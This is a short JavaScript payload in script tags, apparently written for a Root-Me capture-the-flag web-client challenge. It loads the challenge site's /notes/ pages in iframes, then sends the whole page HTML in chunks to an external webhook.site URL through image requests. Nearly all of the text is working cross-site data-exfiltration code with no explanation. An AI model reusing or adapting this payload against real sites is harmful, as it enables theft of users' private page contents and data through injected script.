<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";

async function run(a = 1000, b = 1001) {
    const promises = [];

    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");
        iframe.src = TARGET + i;
        document.documentElement.appendChild(iframe);

        const p = new Promise(resolve => {
            iframe.onload = () => resolve();
        });

        promises.push(p);
    }

    await Promise.all(promises);


    const data = document.documentElement.outerHTML;
    const chunkSize = 1000;
    
    for (let i = 0; i < data.length; i += chunkSize) {
        const chunk = data.slice(i, i + chunkSize);
        new Image().src = WEBHOOK + "?part=" + i + "&data=" + encodeURIComponent(chunk);
    }

    new Image().src = WEBHOOK + "?test=yes";

    console.log("img executed after all iframes loaded");
    new Image().src = WEBHOOK + "?test=no";
}

run();
</script>
